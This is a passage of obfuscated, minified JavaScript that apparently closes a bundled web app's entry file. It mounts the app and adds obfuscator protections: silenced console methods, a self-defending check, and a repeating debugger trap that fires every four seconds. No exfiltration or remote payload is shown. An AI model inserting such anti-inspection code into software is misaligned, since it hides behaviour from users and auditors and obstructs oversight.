    const e = ["info", "TYyHN", "stateObject", "12yeHLNv", "call", "mount", "__proto__", "function *\\( *\\)", "212231aRUaIF", "cAEPi", "constructor", "test", '{}.constructor("return this")( )', "string", "VOtzU", "tnzkN", "while (true) {}", "chain", "warn", "44001wbQlTm", "1479666mspIyz", "LbwqJ", "apply", "xXHjz", "debu", "OVMvv", "error", "SOwvV", "setInterval", "toString", "2ilVBup", "1383728bHZZLn", "bind", "jbtMs", "action", "3433017jUpNhE", "length", "1271065VtvQoE", "DtKoO", "zdFPc", "1518723bhphjz", "use", "counter", "trace", "return (function() ", "OnLER", "TqKLQ", "gger", "log", "console", "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "init", "HVOoz", "wJKmR"];
    return vc = function() {
        return e
    }, vc()
}
const yI = (function() {
    let e = !0;
    return function(t, n) {
        const r = e ? function() {
            const s = Qn;
            if (n)
                if (s(319) !== s(327)) {
                    const i = n.apply(t, arguments);
                    return n = null, i
                } else(function() {
                    const a = s;
                    let c;
                    try {
                        c = _0x986648(a(362) + a(330) + ");")()
                    } catch {
                        c = _0x34b1bf
                    }
                    return c
                })()[s(346)](_0x89483a, 4e3)
        } : function() {};
        return e = !1, r
    }
})();
(function() {
    yI(this, function() {
        const e = Qn;
        if (e(343) === e(332)) return (function(t) {}).constructor(e(334))[e(340)](e(360));
        {
            const t = new RegExp("function *\\( *\\)"),
                n = new RegExp(e(368), "i"),
                r = S0(e(315));
            !t.test(r + "chain") || !n[e(329)](r + "input") ? e(356) === "DtKoO" ? r("0") : _0x56d7ff(0) : e(317) !== "wJKmR" ? (function() {
                return !0
            })[e(328)](e(342) + "gger")[e(322)](e(352)) : S0()
        }
    })()
})();
const Ni = (function() {
        let e = !0;
        return function(t, n) {
            const r = e ? function() {
                const s = Qn;
                if (n) {
                    const i = n[s(340)](t, arguments);
                    return n = null, i
                }
            } : function() {};
            return e = !1, r
        }
    })(),
    wI = Ni(void 0, function() {
        const e = Qn,
            t = function() {
                const i = Qn;
                let o;
                try {
                    i(345) !== i(345) ? _0x4d99d4() : o = Function(i(362) + '{}.constructor("return this")( ));')()
                } catch {
                    o = window
                }
                return o
            },
            n = t(),
            r = n[e(367)] = n[e(367)] || {},
            s = [e(366), e(336), e(318), e(344), "exception", "table", e(361)];
        for (let i = 0; i < s[e(354)]; i++) {
            const o = Ni[e(328)].prototype[e(350)](Ni),
                a = s[i],
                c = r[a] || o;
            o[e(324)] = Ni[e(350)](Ni), o[e(347)] = c[e(347)].bind(c), r[a] = o
        }
    });
wI();

function Qn(e, t) {
    return e = e - 315, vc()[e]
}
const _I = tc(xI);
_I[Mi(359)](G8)[Mi(359)](Y8)[Mi(323)]("#app"), (function() {
    const e = Mi;
    (function() {
        const r = Qn;
        if (r(341) === r(363)) {
            if (_0x53771f) {
                const s = _0x2aadfb[r(340)](_0x544308, arguments);
                return _0xae5f34 = null, s
            }
        } else {
            let s;
            try {
                s = Function(r(362) + '{}.constructor("return this")( ));')()
            } catch {
                s = window
            }
            return s
        }
    })()[e(346)](S0, 4e3)
})();

function S0(e) {
    const t = Mi;

    function n(r) {
        const s = Qn;
        if (typeof r === s(331)) {
            if (s(364) !== "BNHhi") return (function(i) {})[s(328)]("while (true) {}")[s(340)](s(360));
            _0x55bf53(this, function() {
                const i = s,
                    o = new _0x4133d9(i(325)),
                    a = new _0x38f00d(i(368), "i"),
                    c = _0x467099(i(315));
                !o[i(329)](c + i(335)) || !a[i(329)](c + "input") ? c("0") : _0x2bd45b()
            })()
        } else if (s(316) !== "jIKFo")
            if (("" + r / r)[s(354)] !== 1 || r % 20 === 0)(function() {
                const i = s;
                if (i(351) === i(351)) return !0;
                {
                    const o = _0x25bcfc.constructor.prototype[i(350)](_0x461831),
                        a = _0xd0eb0e[_0x3b18b2],
                        c = _0x3bf794[a] || o;
                    o.__proto__ = _0x7eaf56[i(350)](_0x2f328b), o.toString = c[i(347)][i(350)](c), _0x438021[a] = o
                }
            }).constructor("debu" + s(365))[s(322)](s(352));
            else if (s(339) !== s(357))(function() {
            return !1
        }).constructor(s(342) + s(365))[s(340)](s(320));
        else {
            const i = _0x3c5529[s(340)](_0x5e23f4, arguments);
            return _0x1cbac4 = null, i
        } else {
            const i = _0x523b49 ? function() {
                const o = s;
                if (_0x52803d) {
                    const a = _0x5de645[o(340)](_0x257dc9, arguments);
                    return _0x25e218 = null, a
                }
            } : function() {};
            return _0xef39ba = !1, i
        }
        n(++r)
    }
    try {
        if (t(333) !== "BzZab") {
            if (e) return n;
            n(0)
        } else _0x2134b6 = _0x84e7d3(t(362) + '{}.constructor("return this")( ));')()
    } catch {}
}
export {
    F as B, Hi as H, m9 as a, qt as b, _l as c, w4 as d, hs as e, bn as f, Vf as g, na as i, Sl as l, Be as s
};